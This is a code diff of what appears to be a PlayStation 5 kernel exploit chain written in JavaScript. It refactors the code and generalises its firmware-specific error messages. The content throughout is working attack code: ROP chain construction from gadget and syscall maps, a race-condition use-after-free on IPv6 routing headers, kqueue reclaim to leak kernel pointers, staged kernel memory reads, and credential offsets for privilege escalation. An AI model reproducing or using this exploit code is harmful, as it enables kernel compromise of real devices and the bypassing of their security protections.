@@ -1,4 +1,4 @@
-// @egycnq
+// @egycnq (I rewrote egys impli of poops but 90% of his code is likely still factored in)
 
 export const ERRNO = {
   1: "EPERM",
@@ -261,7 +261,7 @@ export function makeHarness(X) {
       throw new Error(
         "syscall 0x" +
           num.toString(16).toUpperCase() +
-          " has no stub in the 5.50 map (rop.js:78): " +
+          " has no stub in the active firmware profile (rop.js:78): " +
           why,
       );
     return P.syscalls[num];
@@ -273,8 +273,8 @@ export function makeHarness(X) {
       throw new Error(
         "gadget '" +
           name +
-          "' is not in the 5.50 " +
-          "wk_gadgetmap (rop.js:78): " +
+          "' is not in the active firmware " +
+          "gadget map (rop.js:78): " +
           why,
       );
     return g;
@@ -1540,7 +1540,7 @@ export function makeTwinEngine(X) {
       throw new Error(
         "syscall 0x" +
           num.toString(16).toUpperCase() +
-          " has no stub in the 5.50 map: " +
+          " has no stub in the active firmware profile: " +
           why +
           ".",
       );
@@ -1550,7 +1550,7 @@ export function makeTwinEngine(X) {
     const g = P.gadgets[name];
     if (g === undefined)
       throw new Error(
-        "gadget '" + name + "' missing from the 5.50 " + "map: " + why,
+        "gadget '" + name + "' missing from the active firmware map: " + why,
       );
     return g;
   }
@@ -1775,7 +1775,7 @@ export function makeTwinEngine(X) {
       throw new Error(
         "emitCall: syscall 0x" +
           num.toString(16).toUpperCase() +
-          " has no stub in the 5.50 map",
+          " has no stub in the active firmware profile",
       );
     chain.fcall(stub, a1, a2, a3, a4, a5);
     chain.write_result4(retPtr);
@@ -3124,7 +3124,7 @@ export const PK = {
 
     PROC_PID: 0xbc,
 
-    // kernel struct offsets: same across PS5 firmwares
+
     PROC_UCRED: 0x40,
 
     UCRED_CR_UID: 0x04,
@@ -3171,8 +3171,8 @@ export const PK = {
 
   LIBC_HANDLE: 0x2,
 
-  // These must come from the selected firmware profile.  The old constants
-  // here were 5.50 addresses and would jump into the wrong 9.00 functions.
+
+
   LK_PTHREAD_CREATE_NAME_NP:
     typeof OFFSET_lk_pthread_create_name_np === "number"
       ? OFFSET_lk_pthread_create_name_np
@@ -3217,7 +3217,7 @@ export const PK = {
   LC_VSNPRINTF: typeof OFFSET_lc_vsnprintf === "number"
     ? OFFSET_lc_vsnprintf : -1,
 
-  // "pthread" or "thr_new"; window.POOPS_SPAWN overrides
+
   STAGE5_SPAWN: "pthread",
 
   STAGE5_THR_STACK: 0x8000,
@@ -3237,7 +3237,7 @@ export const PK = {
   SYSTEM_AUTHID_LO: 0x00010003,
   SYSTEM_AUTHID_HI: 0x48000000,
 
-  // what poops.c and lapse.js both write
+
   SYSCORE_AUTHID_LO: 0x00000007,
   SYSCORE_AUTHID_HI: 0x48000000,
 
@@ -3394,7 +3394,6 @@ export function makePoopsEngine(X) {
     curproc: null,
 
     aliasesRepaired: false,
-
     jailbroken: false,
     dlsymEnabled: false,
     masterPipeData: null,
@@ -3425,7 +3424,7 @@ export function makePoopsEngine(X) {
       throw new Error(
         "syscall 0x" +
           num.toString(16).toUpperCase() +
-          " has no stub in the 5.50 map: " +
+          " has no stub in the active firmware profile: " +
           why,
       );
     return P.syscalls[num];
@@ -3496,9 +3495,6 @@ export function makePoopsEngine(X) {
 
     b.sndbuf = alloc(4, "so-sndbuf-cell");
     b.fionread = alloc(4, "fionread-cell");
-    b.dlsymName = alloc(64, "dlsym-name");
-    b.dlsymOut = alloc(8, "dlsym-out");
-    b.dlsymRet = alloc(8, "dlsym-ret");
 
     b.pipebuf = alloc(PK.PIPEBUF_SIZE, "stage3-pipebuf-0x18");
     b.rwScratch = alloc(64, "stage3-rw-scratch");
@@ -4111,16 +4107,10 @@ export function makePoopsEngine(X) {
   ];
 
   async function attemptRace(opts) {
-    const o = opts || {};
-    const n = TW.S.n;
-    const b = S.buf;
+    const o = opts || {}, n = TW.S.n, b = S.buf;
     const rep = {
-      ok: false,
-      step: "",
-      detail: "",
-      twins: null,
-      reclaimRounds: -1,
-      tripletAttempts: [-1, -1],
+      ok: false, step: "", detail: "", twins: null,
+      reclaimRounds: -1, tripletAttempts: [-1, -1]
     };
     const at = (s) => {
       rep.step = s;
@@ -4135,7 +4125,6 @@ export function makePoopsEngine(X) {
     }
     await runBuilt("free-all-rthdrs", () => {
       armRet(n);
-
       for (let i = 0; i < n; ++i) if (!TW.isBurned(i)) emitFreeRthdr(i, i);
     });
     let freeFail = 0;
@@ -4147,11 +4136,9 @@ export function makePoopsEngine(X) {
     const pre = await preFlushAct();
     if (pre && pre.ok === false) {
       rep.detail = "trigger did not arm: " + (pre.why || "?");
-
       rep.terminal = !!pre.terminal;
       return rep;
     }
-
     flushQueueSoft();
     const mk0 = markStats();
     const mkOpen = { q: mk0.queued, b: mk0.blocked };
@@ -4163,7 +4150,6 @@ export function makePoopsEngine(X) {
       rep.marksQueuedInWindow = mk1.queued - mkOpen.q;
       rep.marksBlockedInWindow = mk1.blocked - mkOpen.b;
     };
-
     at(STEPS[2]);
     const fl = await flushIovWorkers(PK.IOV_FLUSH_ROUNDS, "attempt");
     rep.recvmsgRet = fl.firstRecvmsgRet;
@@ -4181,56 +4167,34 @@ export function makePoopsEngine(X) {
       tw = await TW.findTwins({
         attempts: PK.MAX_ROUNDS_TWIN,
         batch: 1,
-        deadlineMs: o.twinDeadlineMs || 20000,
+        deadlineMs: o.twinDeadlineMs || 20000
       });
     } finally {
       TW.setScanMarksQuiet(wasScanQuiet);
     }
-
     closeWindow();
-
     flushQueueSoft();
-
     if (!tw.found && tw.total)
       flushMark(
         "TWIN-SCAN-DONE",
-        "reason=" +
-          (tw.reason || "?") +
-          "-attempts=" +
-          tw.attempts +
-          "-ms=" +
-          tw.ms +
-          "-totSprayFail=" +
-          tw.total.sprayFailCount +
-          "-totReadFail=" +
-          tw.total.readFailCount +
-          "-totSelf=" +
-          tw.total.selfTagged +
-          "of" +
-          tw.total.examined,
+        "reason=" + (tw.reason || "?") + "-attempts=" + tw.attempts
+          + "-ms=" + tw.ms + "-totSprayFail=" + tw.total.sprayFailCount
+          + "-totReadFail=" + tw.total.readFailCount + "-totSelf="
+          + tw.total.selfTagged + "of" + tw.total.examined
       );
     if (!tw.found) {
-      rep.detail =
-        "no twin in " +
-        tw.attempts +
-        " rounds (" +
-        (tw.reason || "?") +
-        "). " +
-        (S.triggered
-          ? "trigger fired: F6 or F7, indistinguishable from here"
-          : "negative control: expected");
+      rep.detail = "no twin in " + tw.attempts + " rounds ("
+        + (tw.reason || "?") + "). " + (S.triggered
+        ? "trigger fired: F6 or F7, indistinguishable from here"
+        : "negative control: expected");
       return rep;
     }
     rep.twins = [tw.i, tw.j];
-
     at(STEPS[5]);
     flushMark(
       "LINE-B",
-      "free_rthdr(twins[1]=" +
-        tw.j +
-        ") -- socket " +
-        tw.i +
-        " now holds a dangling ip6po_rthdr",
+      "free_rthdr(twins[1]=" + tw.j + ") -- socket " + tw.i
+        + " now holds a dangling ip6po_rthdr"
     );
     await runBuilt("free-twin1", () => {
       armRet(3);
@@ -4238,7 +4202,6 @@ export function makePoopsEngine(X) {
       emit(PSYS.SCHED_YIELD, retPtr(1));
       emit(PSYS.SCHED_YIELD, retPtr(2));
     });
-
     at(STEPS[6]);
     let reclaimed = false;
     const t6 = Date.now();
@@ -4261,11 +4224,10 @@ export function makePoopsEngine(X) {
         reclaimed = true;
         flushMark(
           "RECLAIM-WIN",
-          "round=" + k + "-u32[0]=1-optlenOut=" + r32(b.lenOut.u8, 0),
+          "round=" + k + "-u32[0]=1-optlenOut=" + r32(b.lenOut.u8, 0)
         );
         break;
       }
-
       await runBuilt("reclaim-drain-w", () => {
         armRet(1);
         emit(PSYS.WRITE, retPtr(0), S.iovSockB, b.scratchBig.base, 1);
@@ -4275,30 +4237,24 @@ export function makePoopsEngine(X) {
     }
     rep.reclaimRounds = k;
     if (!reclaimed) {
-      rep.detail =
-        "reclaim loop exhausted " +
-        k +
-        " rounds without u32[0]==1; socket " +
-        tw.i +
-        " holds a dangling routing header";
+      rep.detail = "reclaim loop exhausted " + k
+        + " rounds without u32[0]==1; socket " + tw.i
+        + " holds a dangling routing header";
       await releaseIovAndSettle("reclaim-failed");
-
       if (TW.burn(tw.i, "dangling after lost s6 reclaim")) rep.burned = 1;
       if (TW.burn(tw.j, "twin of " + tw.i + ", freed at LINE B"))
         rep.burned = 2;
       TW.clearCorrupt(
-        "both aliased sockets burned out of the bank; " +
-          "that chunk is no longer freed or sprayed",
+        "both aliased sockets burned out of the bank; "
+          + "that chunk is no longer freed or sprayed"
       );
       rep.retryable = true;
       return rep;
     }
-
     at(STEPS[7]);
     TW.S.triplets[0] = tw.i;
     await crfree("third free -- poops.c:745-746 / poops_ps5.lua:690-691");
     await yieldN(1);
-
     for (let z = 0; z < 8; ++z) b.readback.u8[z] = 0xee;
     w32(b.lenOut.u8, 0, 8);
     await runBuilt("post-third-free-probe", () => {
@@ -4307,79 +4263,53 @@ export function makePoopsEngine(X) {
     });
     flushMark(
       "POST-THIRD-FREE",
-      "master=" +
-        tw.i +
-        "-ret=" +
-        retOf(0) +
-        "-word0=0x" +
-        r32(b.readback.u8, 0).toString(16) +
-        "-word4=0x" +
-        r32(b.readback.u8, 4).toString(16) +
-        "-optlenOut=" +
-        r32(b.lenOut.u8, 0) +
-        "-verdict=" +
-        (r32(b.readback.u8, 0) === 1
-          ? "CHUNK-STILL-HELD-third-free-did-not-land"
-          : "chunk-recycled-fault-is-downstream"),
+      "master=" + tw.i + "-ret=" + retOf(0) + "-word0=0x"
+        + r32(b.readback.u8, 0).toString(16) + "-word4=0x"
+        + r32(b.readback.u8, 4).toString(16) + "-optlenOut="
+        + r32(b.lenOut.u8, 0) + "-verdict="
+        + (r32(b.readback.u8, 0) === 1
+        ? "CHUNK-STILL-HELD-third-free-did-not-land"
+        : "chunk-recycled-fault-is-downstream")
     );
-
     at(STEPS[8]);
     const t1 = await TW.findTriplet(TW.S.triplets[0], -1, {
       attempts: PK.MAX_ROUNDS_TRIPLET,
-      deadlineMs: o.tripletDeadlineMs || 30000,
+      deadlineMs: o.tripletDeadlineMs || 30000
     });
     rep.tripletAttempts[0] = t1.attempts;
     if (t1.j < 0) {
-      rep.detail =
-        "find_triplet #1 returned -1 (" +
-        (t1.reason || "?") +
-        "/" +
-        (t1.why || "?") +
-        ") after " +
-        t1.attempts +
-        " rounds";
+      rep.detail = "find_triplet #1 returned -1 (" + (t1.reason || "?")
+        + "/" + (t1.why || "?") + ") after " + t1.attempts + " rounds";
       await releaseIovAndSettle("triplet1-failed");
       return rep;
     }
     TW.S.triplets[1] = t1.j;
-
     at(STEPS[9]);
     await runBuilt("release-iovecs", () => {
       armRet(1);
       emit(PSYS.WRITE, retPtr(0), S.iovSockB, b.scratchBig.base, 1);
     });
-
     at(STEPS[10]);
     const t2 = await TW.findTriplet(TW.S.triplets[0], TW.S.triplets[1], {
       attempts: PK.MAX_ROUNDS_TRIPLET,
-      deadlineMs: o.tripletDeadlineMs || 30000,
+      deadlineMs: o.tripletDeadlineMs || 30000
     });
     rep.tripletAttempts[1] = t2.attempts;
-
     at(STEPS[11]);
     await H.waitFinished(S.iovGroup, PK.WAIT_DEADLINE_MS, "attempt-resettle");
     await readReleaseByte("resettle-read");
     if (t2.j < 0) {
       TW.S.triplets[2] = -1;
-      rep.detail =
-        "find_triplet #2 returned -1 (" +
-        (t2.reason || "?") +
-        "/" +
-        (t2.why || "?") +
-        ")";
+      rep.detail = "find_triplet #2 returned -1 (" + (t2.reason || "?")
+        + "/" + (t2.why || "?") + ")";
       return rep;
     }
     TW.S.triplets[2] = t2.j;
     rep.ok = TW.tripletsValid();
-    rep.detail = rep.ok
-      ? "triplets " +
-        TW.S.triplets.join(",") +
-        " (fds " +
-        TW.S.triplets.map(bankFd).join(",") +
-        ")"
-      : "find_triplet returned " +
-        TW.S.triplets.join(",") +
-        " but tripletsValid() is false";
+    rep.detail = rep.ok ? "triplets " + TW.S.triplets.join(",") + " (fds "
+      + TW.S.triplets.map(bankFd).join(",") + ")"
+      : "find_triplet returned " + TW.S.triplets.join(",")
+        + " but tripletsValid() is false";
     return rep;
   }
 
@@ -4448,53 +4378,83 @@ export function makePoopsEngine(X) {
     }
   }
 
-  async function stage0(opts) {
-    const o = opts || {};
-    const max =
-      o.attempts ||
-      (S.triggerFamily === "netcontrol"
-        ? PK.NETCTRL_ATTEMPTS
-        : S.triggerFamily === "overflow"
-          ? PK.TRIPLEFREE_ATTEMPTS
-          : 1);
-    const deadlineAt = Date.now() + (o.deadlineMs || 180000);
-    const t0 = Date.now();
+  async function releaseUioWriteAndSettle(why, size) {
+    const b = S.buf;
+    const g = S.uioWriteGroup;
+    if (!g || !g.spawned || !g.spawned.length) return;
+    const n = Math.max(1, size || 8);
+    try {
+      await runBuilt("uioW-release-" + why, () => {
+        armRet(PK.UIO_THREAD_NUM);
+        for (let i = 0; i < PK.UIO_THREAD_NUM; ++i)
+          emit(PSYS.WRITE, retPtr(i), S.uioSockB, b.uioWriteBuf.base, n);
+      });
+      await H.waitFinished(g, PK.WAIT_DEADLINE_MS, "uioW-release:" + why);
+      flushMark("UIOW-RELEASED", why + "-size=" + n);
+    } catch (err) {
+      forceSettled(g, "uioW-release-failed-" + why);
+      flushMark(
+        "UIOW-RELEASE-FAILED",
+        why + "-" + String((err && err.message) || err).slice(0, 80)
+      );
+    }
+  }
+
+  async function stage0(options) {
+    const settings = options || {};
+    let maxAttempts = settings.attempts;
+
+    if (!maxAttempts) {
+      if (S.triggerFamily === "netcontrol") {
+        maxAttempts = PK.NETCTRL_ATTEMPTS;
+      } else if (S.triggerFamily === "overflow") {
+        maxAttempts = PK.TRIPLEFREE_ATTEMPTS;
+      } else {
+        maxAttempts = 1;
+      }
+    }
+
+    const deadlineAt = Date.now() + (settings.deadlineMs || 180000);
+    const startedAt = Date.now();
     const log = [];
-    let lastRep = null;
-    for (let attempt = 1; attempt <= max; ++attempt) {
+    let lastReport = null;
+
+    for (let attempt = 1; attempt <= maxAttempts; attempt += 1) {
       if (Date.now() > deadlineAt) {
         return {
           ok: false,
           attempts: attempt - 1,
-          ms: Date.now() - t0,
-          log,
-          why: "wall-clock deadline",
+          ms: Date.now() - startedAt,
+          log: log,
+          why: "wall-clock deadline"
         };
       }
+
       flushMark(
         "STAGE0-ATTEMPT",
         attempt +
           "-of-" +
-          max +
+          maxAttempts +
           "-family=" +
           S.triggerFamily +
           "-freeFdIdx=" +
           S.freeFdIdx +
           "-crfrees=" +
-          S.crfrees,
+          S.crfrees
       );
       S.attemptsRun = attempt;
-      const aT0 = Date.now();
+      const attemptStartedAt = Date.now();
 
-      const wasRace = setRaceMode(true);
-      let r;
+      const previousRaceMode = setRaceMode(true);
+      let report;
       try {
-        r = await attemptRace(o);
+        report = await attemptRace(settings);
       } finally {
-        setRaceMode(wasRace);
+        setRaceMode(previousRaceMode);
       }
-      const aMs = Date.now() - aT0;
-      lastRep = r;
+
+      const attemptElapsedMs = Date.now() - attemptStartedAt;
+      lastReport = report;
 
       flushMark(
         "IOV-FLUSH-DONE",
@@ -4503,45 +4463,51 @@ export function makePoopsEngine(X) {
           "-rounds=" +
           PK.IOV_FLUSH_ROUNDS +
           "-stillBlocked=" +
-          r.blockedAfterSignal +
+          report.blockedAfterSignal +
           "-of-" +
-          r.iovRacers +
+          report.iovRacers +
           "-leftReadGate=" +
-          r.awakeAfterSignal +
+          report.awakeAfterSignal +
           "-recvmsgRet=" +
-          r.recvmsgRet +
+          report.recvmsgRet +
           "-step=" +
-          r.step,
+          report.step
       );
 
-      const mkRun = markStats();
+      const markSnapshot = markStats();
       flushMark(
         "MARK-BUDGET",
         "attempt=" +
           attempt +
           "-attemptMs=" +
-          aMs +
+          attemptElapsedMs +
           "-windowMs=" +
-          (r.windowMs === undefined ? -1 : r.windowMs) +
+          (report.windowMs === undefined ? -1 : report.windowMs) +
           "-windowQueued=" +
-          (r.marksQueuedInWindow === undefined ? -1 : r.marksQueuedInWindow) +
+          (report.marksQueuedInWindow === undefined
+            ? -1
+            : report.marksQueuedInWindow) +
           "-windowBlocked=" +
-          (r.marksBlockedInWindow === undefined ? -1 : r.marksBlockedInWindow) +
+          (report.marksBlockedInWindow === undefined
+            ? -1
+            : report.marksBlockedInWindow) +
           "-runQueued=" +
-          mkRun.queued +
+          markSnapshot.queued +
           "-runBlocked=" +
-          mkRun.blocked +
+          markSnapshot.blocked +
           "-PREV-MEASURED-attemptMs=13910" +
-          "-PREDICTED=550to700",
+          "-PREDICTED=550to700"
       );
+
       log.push(
         "a" +
           attempt +
           ": " +
-          r.step +
-          (r.detail ? " -- " + r.detail.slice(0, 160) : ""),
+          report.step +
+          (report.detail ? " -- " + report.detail.slice(0, 160) : "")
       );
-      if (r.ok) {
+
+      if (report.ok) {
         flushMark(
           "STAGE0-OK",
           "attempt=" +
@@ -4549,29 +4515,26 @@ export function makePoopsEngine(X) {
             "-triplets=" +
             TW.S.triplets.join(".") +
             "-ms=" +
-            (Date.now() - t0),
+            (Date.now() - startedAt)
         );
-        // Once the triplet exists, the race has deliberately disturbed live
-        // kernel objects.  Do not depend on another worker-ROP syscall merely
-        // to settle: a stalled nanosleep here previously left the UI pinned at
-        // ps3_stage0 even though STAGE0-OK had already been reached.
         await sleep(PK.SUCCESS_SETTLE_MS);
         return {
           ok: true,
           attempts: attempt,
-          ms: Date.now() - t0,
-          log,
-          last: r,
+          ms: Date.now() - startedAt,
+          log: log,
+          last: report
         };
       }
-      if (r.terminal) {
+
+      if (report.terminal) {
         return {
           ok: false,
           attempts: attempt,
-          ms: Date.now() - t0,
-          log,
-          why: "attempt could not arm: " + (r.detail || "?"),
-          last: r,
+          ms: Date.now() - startedAt,
+          log: log,
+          why: "attempt could not arm: " + (report.detail || "?"),
+          last: report
         };
       }
 
@@ -4579,21 +4542,23 @@ export function makePoopsEngine(X) {
         return {
           ok: false,
           attempts: attempt,
-          ms: Date.now() - t0,
-          log,
+          ms: Date.now() - startedAt,
+          log: log,
           why: "alias exists, attempt_race not re-enterable: " + TW.corrupt,
-          last: r,
+          last: report
         };
       }
+
       await sleepK(PK.ATTEMPT_GAP_MS);
     }
+
     return {
       ok: false,
-      attempts: max,
-      ms: Date.now() - t0,
-      log,
-      why: "all " + max + " attempts failed",
-      last: lastRep,
+      attempts: maxAttempts,
+      ms: Date.now() - startedAt,
+      log: log,
+      why: "all " + maxAttempts + " attempts failed",
+      last: lastReport
     };
   }
 
@@ -5092,35 +5057,21 @@ export function makePoopsEngine(X) {
   }
 
   async function stage1Body(opts) {
-    const o = opts || {};
-    const b = S.buf;
+    const o = opts || {}, b = S.buf;
     const B = Math.max(1, Math.min(64, o.kqBatch || PK.KQ_BATCH));
     const rounds = Math.max(1, o.rounds || PK.KQ_ROUNDS);
     const deadlineAt = Date.now() + (o.deadlineMs || 90000);
     const out = {
-      ok: false,
-      why: "",
-      hits: [],
-      fdp: null,
-      rounds: 0,
-      kqOpened: 0,
-      kqClosed: 0,
-      sig64: false,
-      outLens: [],
-      batches: [],
-      independent: false,
-      confirmGaveUp: false,
-      winnerOutLen: -1,
-
-      sigSeen: new Map(),
+      ok: false, why: "", hits: [], fdp: null, rounds: 0,
+      kqOpened: 0, kqClosed: 0, sig64: false, outLens: [], batches: [],
+      independent: false, confirmGaveUp: false, winnerOutLen: -1,
+      sigSeen: new Map()
     };
-
     needStub(PSYS.KQUEUE, "stage 1 kqueue reclaim");
     if (!TW.tripletsValid()) {
       out.why = "triplets invalid";
       return out;
     }
-
     const CELL = 256;
     const cells = alloc(CELL * B, "kq-readback-cells-" + B + "x" + CELL);
     const lens = alloc(4 * B, "kq-optlen-cells-" + B);
@@ -5129,7 +5080,7 @@ export function makePoopsEngine(X) {
 
     flushMark(
       "STAGE1-FREE-T1",
-      "free_rthdr(triplets[1]=" + TW.S.triplets[1] + ")",
+      "free_rthdr(triplets[1]=" + TW.S.triplets[1] + ")"
     );
     await runBuilt("stage1-free-t1", () => {
       armRet(3);
@@ -5137,15 +5088,10 @@ export function makePoopsEngine(X) {
       emit(PSYS.SCHED_YIELD, retPtr(1));
       emit(PSYS.SCHED_YIELD, retPtr(2));
     });
-
     let done = 0;
-
-    const confirmBudget = Math.max(
-      B,
-      Math.min(rounds, o.confirmRounds || B * 64),
-    );
+    const confirmBudget = Math.max(B,
+      Math.min(rounds, o.confirmRounds || B * 64));
     let confirmStartedAt = -1;
-
     let batch = 0;
     while (done < rounds && Date.now() < deadlineAt) {
       const nb = Math.min(B, rounds - done);
@@ -5164,7 +5110,6 @@ export function makePoopsEngine(X) {
       });
       done += nb;
       out.rounds = done;
-
       const kqByCell = new Array(nb).fill(-1);
       let openedCount = 0;
       for (let i = 0; i < nb; ++i) {
@@ -5178,7 +5123,6 @@ export function makePoopsEngine(X) {
       }
       S.kqueuesOpened += openedCount;
       out.kqOpened += openedCount;
-
       let winner = -1;
       for (let i = 0; i < nb; ++i) {
         if (retOf(2 * i + 1) !== 0) continue;
@@ -5194,7 +5138,7 @@ export function makePoopsEngine(X) {
             out.sigSeen.set(sig32, {
               n: 1,
               outLen,
-              fdp: hx(r64(cells.u8, i * CELL + PK.OFF.KQ_FDP)),
+              fdp: hx(r64(cells.u8, i * CELL + PK.OFF.KQ_FDP))
             });
           continue;
         }
@@ -5203,11 +5147,7 @@ export function makePoopsEngine(X) {
         const fdp = r64(cells.u8, i * CELL + PK.OFF.KQ_FDP);
         if (isZero64(fdp)) continue;
         out.hits.push({
-          round: done - nb + i,
-          batch,
-          fdp,
-          outLen,
-          sig64: sigHi === 0,
+          round: done - nb + i, batch, fdp, outLen, sig64: sigHi === 0
         });
         winner = i;
         break;
@@ -5217,23 +5157,12 @@ export function makePoopsEngine(X) {
         const h = out.hits[out.hits.length - 1];
         flushMark(
           "STAGE1-HIT",
-          "batch=" +
-            batch +
-            "-round=" +
-            h.round +
-            "-outLen=" +
-            h.outLen +
-            "-sig32=0x" +
-            PK.KQ_SIGNATURE.toString(16) +
-            "-sig64held=" +
-            out.sig64 +
-            "-kq_fdp=" +
-            hx(h.fdp) +
-            "-hitsSoFar=" +
-            out.hits.length,
+          "batch=" + batch + "-round=" + h.round + "-outLen=" + h.outLen
+            + "-sig32=0x" + PK.KQ_SIGNATURE.toString(16)
+            + "-sig64held=" + out.sig64 + "-kq_fdp=" + hx(h.fdp)
+            + "-hitsSoFar=" + out.hits.length
         );
       }
-
       const winFd = winner >= 0 ? kqByCell[winner] : -1;
       const nonWinners = kqByCell.filter((fd) => fd >= 0 && fd !== winFd);
       const dropKq = (fd) => {
@@ -5264,7 +5193,6 @@ export function makePoopsEngine(X) {
       const distinct = Object.keys(batches).length;
       if (distinct >= 2) break;
       if (distinct >= 1 && o.confirm === false) break;
-
       if (distinct >= 1) {
         if (confirmStartedAt < 0) confirmStartedAt = done;
         if (done - confirmStartedAt >= confirmBudget) {
@@ -5274,62 +5202,35 @@ export function makePoopsEngine(X) {
       }
       await yieldN(1);
     }
-
     if (!out.hits.length) {
       const seen = [...out.sigSeen.entries()]
         .sort((a, b) => b[1].n - a[1].n)
-        .map(
-          ([s, v]) =>
-            "0x" +
-            (s >>> 0).toString(16) +
-            " x" +
-            v.n +
-            " (+0xA8=" +
-            v.fdp +
-            ", outLen=" +
-            v.outLen +
-            ")",
-        );
+        .map(([s, v]) => "0x" + (s >>> 0).toString(16) + " x" + v.n
+          + " (+0xA8=" + v.fdp + ", outLen=" + v.outLen + ")");
       flushMark(
         "STAGE1-NO-SIG",
-        "distinct=" +
-          out.sigSeen.size +
-          "-expected=0x" +
-          PK.KQ_SIGNATURE.toString(16) +
-          "-top=" +
-          (seen[0] || "none"),
+        "distinct=" + out.sigSeen.size + "-expected=0x"
+          + PK.KQ_SIGNATURE.toString(16) + "-top=" + (seen[0] || "none")
       );
-      out.why =
-        "no kqueue landed in the freed chunk in " +
-        out.rounds +
-        " rounds (outLen samples: " +
-        out.outLens.join(",") +
-        "). " +
-        (out.sigSeen.size
-          ? "no chunk read matched KQ_SIGNATURE 0x" +
-            PK.KQ_SIGNATURE.toString(16) +
-            "; at +0x08, " +
-            "most frequent first: " +
-            seen.join("; ") +
-            ""
-          : "nothing passed the copyout gate (outLen >= 0x" +
-            PK.KQ_MIN_OUTLEN.toString(16) +
-            ")") +
-        " ERR_LEAK_KQUEUE (poops.c:55, :1478).";
+      out.why = "no kqueue landed in the freed chunk in " + out.rounds
+        + " rounds (outLen samples: " + out.outLens.join(",") + "). "
+        + (out.sigSeen.size
+        ? "no chunk read matched KQ_SIGNATURE 0x"
+          + PK.KQ_SIGNATURE.toString(16) + "; at +0x08, "
+          + "most frequent first: " + seen.join("; ") + ""
+        : "nothing passed the copyout gate (outLen >= 0x"
+          + PK.KQ_MIN_OUTLEN.toString(16) + ")")
+        + " ERR_LEAK_KQUEUE (poops.c:55, :1478).";
       return out;
     }
     const first = out.hits[0].fdp;
     for (const h of out.hits) {
       if (h.fdp.low !== first.low || h.fdp.hi !== first.hi) {
-        out.why =
-          "two kqueue hits disagree about kq_fdp: " +
-          hx(first) +
-          " vs " +
-          hx(h.fdp);
+        out.why = "two kqueue hits disagree about kq_fdp: " + hx(first)
+          + " vs " + hx(h.fdp);
         return out;
       }
     }
-
     const v = acceptKernelPtr(first);
     if (v !== true) {
       out.why = "proc_filedesc " + hx(first) + " rejected: " + v;
@@ -5340,29 +5241,20 @@ export function makePoopsEngine(X) {
     const seenBatches = {};
     for (const h of out.hits) seenBatches[h.batch] = 1;
     out.batches = Object.keys(seenBatches).map(Number);
-
     out.independent = out.batches.length >= 2;
     out.winnerOutLen = out.hits[0].outLen;
     flushMark(
       "STAGE1-FDP",
-      "proc_filedesc=" +
-        hx(first) +
-        "-hits=" +
-        out.hits.length +
-        "-batches=" +
-        out.batches.join(".") +
-        "-independent=" +
-        out.independent +
-        "-confirmGaveUp=" +
-        (out.confirmGaveUp ? 1 : 0),
+      "proc_filedesc=" + hx(first) + "-hits=" + out.hits.length
+        + "-batches=" + out.batches.join(".") + "-independent="
+        + out.independent + "-confirmGaveUp=" + (out.confirmGaveUp ? 1 : 0)
     );
-
     const dl = Date.now() + (o.repairDeadlineMs || 60000);
     let got = -1;
     for (let z = 0; z < PK.STAGE1_REPAIR_TRIES; ++z) {
       const r = await TW.findTriplet(TW.S.triplets[0], TW.S.triplets[2], {
         attempts: PK.STAGE1_REPAIR_ATTEMPTS,
-        deadlineAt: dl,
+        deadlineAt: dl
       });
       if (r.j >= 0) {
         got = r.j;
@@ -5374,10 +5266,8 @@ export function makePoopsEngine(X) {
     }
     TW.S.triplets[1] = got;
     if (got < 0 || !TW.tripletsValid()) {
-      out.why =
-        "stage1: triplet repair failed (triplets=" +
-        TW.S.triplets.join(",") +
-        ")";
+      out.why = "stage1: triplet repair failed (triplets="
+        + TW.S.triplets.join(",") + ")";
       return out;
     }
     out.ok = true;
@@ -5392,23 +5282,16 @@ export function makePoopsEngine(X) {
       out.why = "no proc_filedesc";
       return out;
     }
-
-    const t0 = Date.now();
-    const deadlineAt = t0 + (o.deadlineMs || 900000);
+    const t0 = Date.now(), deadlineAt = t0 + (o.deadlineMs || 900000);
     out.deadlineMs = deadlineAt - t0;
-
     for (let a = 1; a <= attempts; ++a) {
       if (Date.now() > deadlineAt) {
-        out.why =
-          (out.why ? out.why + "; " : "") +
-          "stage 2 wall clock " +
-          Math.round((deadlineAt - t0) / 1000) +
-          " s hit after " +
-          (a - 1) +
-          " attempt(s)";
+        out.why = (out.why ? out.why + "; " : "") + "stage 2 wall clock "
+          + Math.round((deadlineAt - t0) / 1000) + " s hit after "
+          + (a - 1) + " attempt(s)";
         flushMark(
           "STAGE2-DEADLINE",
-          "attempts=" + (a - 1) + "-ms=" + (Date.now() - t0),
+          "attempts=" + (a - 1) + "-ms=" + (Date.now() - t0)
         );
         break;
       }
@@ -5422,25 +5305,16 @@ export function makePoopsEngine(X) {
       }
       flushMark(
         "STAGE2-RETRY",
-        "attempt=" +
-          a +
-          "-of-" +
-          attempts +
-          "-elapsedMs=" +
-          (Date.now() - t0) +
-          "-remainingMs=" +
-          Math.max(0, deadlineAt - Date.now()) +
-          "-why=" +
-          out.why.slice(0, 100),
+        "attempt=" + a + "-of-" + attempts + "-elapsedMs="
+          + (Date.now() - t0) + "-remainingMs="
+          + Math.max(0, deadlineAt - Date.now()) + "-why="
+          + out.why.slice(0, 100)
       );
-
       const rep = await TW.repairTriplets({ deadlineMs: 20000 });
       if (!rep.ok) {
-        out.why =
-          (out.why ? out.why + "; " : "") +
-          "triplet repair failed (" +
-          (rep.why || "?") +
-          "), no further attempt";
+        out.why = (out.why ? out.why + "; " : "")
+          + "triplet repair failed (" + (rep.why || "?")
+          + "), no further attempt";
         break;
       }
       await sleepK(PK.STAGE2_SLEEP_MS);
@@ -5459,35 +5333,23 @@ export function makePoopsEngine(X) {
       flushMark("STAGE2-READ-PRE", label + "-kaddr=" + hx(kaddr));
       const r = await kslow64(kaddr, "stage2:" + label, {
         repairDeadlineMs: 20000,
-        loopDeadlineMs: 30000,
+        loopDeadlineMs: 30000
       });
-      out.steps.push(
-        label +
-          "=" +
-          (r.ok ? hx(r.value) : "FAILED") +
-          " [" +
-          r.log.join(" | ") +
-          "]",
-      );
+      out.steps.push(label + "=" + (r.ok ? hx(r.value) : "FAILED")
+        + " [" + r.log.join(" | ") + "]");
       flushMark("STAGE2-READ", label + "=" + (r.ok ? hx(r.value) : "FAILED"));
       return r;
     };
-
     await TW.repairTriplets({ deadlineMs: 20000 });
     await sleepK(PK.STAGE2_SLEEP_SHORT_MS);
-
-    const a1 = await step(
-      "fdescenttbl",
-      S.procFiledesc.add32(PK.OFF.FILEDESC_OFILES),
-    );
+    const a1 = await step("fdescenttbl",
+      S.procFiledesc.add32(PK.OFF.FILEDESC_OFILES));
